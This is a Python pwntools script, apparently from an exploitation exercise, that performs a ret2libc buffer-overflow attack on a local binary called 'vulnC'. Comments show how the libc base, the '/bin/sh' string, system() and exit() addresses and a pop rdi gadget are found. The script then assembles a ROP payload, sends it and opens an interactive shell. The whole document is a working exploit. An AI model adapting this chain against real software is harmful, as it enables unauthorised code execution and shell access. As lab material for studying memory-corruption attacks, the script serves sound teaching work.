import struct
import pwn

# vulnC is a 64-bit dynamically linked binary
# It's stack is not executable, ASLR is turned off

target = pwn.process('./vulnC')
libc_elf = pwn.ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

# Step 1) Obtain libc base, ptr to '/bin/bash', system(), and exit() addresses
# There are a number of ways to accomplish each of these tasks

# Obtaining libc base:
	# run binary in gdb and use vmmap:
	# 0x007ffff7dbe000 0x007ffff7de0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
libc_base = 0x007ffff7dbe000

# Obtaining offset to '/bin/sh' (here are a few ways you could do this) 
# You could run: strings -a -t x /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep /bin/sh
# 1b45bd /bin/sh
# Or just:
bin_sh_offset = next(libc_elf.search(b'/bin/sh'))

# Obtaining address of system() and exit() (there are many ways you could do this)
# You could do 'print system'/'print exit' in gdb
	# $1 = {int (const char *)} 0x7ffff7e10290 <__libc_system>
	# $2 = {void (int)} 0x7ffff7e04a40 <__GI_exit>
# Or, you could find the offset in libc with:
# objdump -D /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
# Or just:
system_offset = libc_elf.symbols['system']
exit_offset = 	libc_elf.symbols['exit']
# and add that offset to the libc base addr

system_addr = struct.pack("<Q", libc_base + system_offset)
exit_addr = struct.pack("<Q", libc_base + exit_offset)
ptr_to_bin_bash = struct.pack("<Q", libc_base + bin_sh_offset)


# Step 2) Obtain pop rdi gadget:
# ropper --file vulnC --search "pop rdi; ret;"
# 0x00000000004012c3: pop rdi; ret;
pop_rdi = struct.pack("<Q", 0x004012c3)
ret_instruction = struct.pack("<Q", 0x004012c3 + 1) # This is needed because x86_64 requires that calls be 16-byte aligned (see below)

##############################
#### Assemble the Payload ####
##############################

payload = b'a'*136 # 136 is position of return address found from cyclic
payload += pop_rdi # We used radare2 to find a gadget, which pops the stack into rdi and returns
payload += ptr_to_bin_bash # The gadget will put this value into rdi
payload += ret_instruction # We need a ret instruction after pointer to /bin/bash for 16-byte stack alignment
payload += system_addr # system() will get its arg from $rdi which is where we have pushed the pointer to "/bin/sh"
payload += exit_addr

rec_str = target.recv(1024) # Receive prompt from binary

print(rec_str)

target.sendline(payload)
target.interactive()
